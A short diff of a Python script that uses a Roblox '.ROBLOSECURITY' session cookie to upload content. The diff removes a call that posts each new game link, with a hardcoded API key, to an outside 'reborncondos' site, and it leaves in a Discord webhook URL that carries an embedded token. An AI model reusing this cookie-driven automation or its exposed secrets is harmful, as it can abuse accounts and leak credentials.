@@ -107,16 +107,6 @@ def main(cookie):
                   cookies={'.ROBLOSECURITY': cookie},
                   data=myfiles)
     if upload.status_code == 200:
-        json2222 = {
-            'data': f"https://www.roblox.com/games/{gameId}/"
-        }
-        headers = {
-            'X-Api-Key': 'asoidewfoef'
-        }
-        r333 = requests.post("http://recentgames.reborncondos.xyz/addLink",json=json2222, headers=headers)
-
-        print(f' [Reborn] {r333.text}- Request to site')
-
         webhook = Webhook.from_url(
             "https://discord.com/api/webhooks/909985389886963775/de8TXAHLIlt9A3_kfy0PEi06-jYt-3fD-r59nKkiHhkBi8Ii9fDMO27q4gMYaTjsVb4H",
             adapter=RequestsWebhookAdapter())
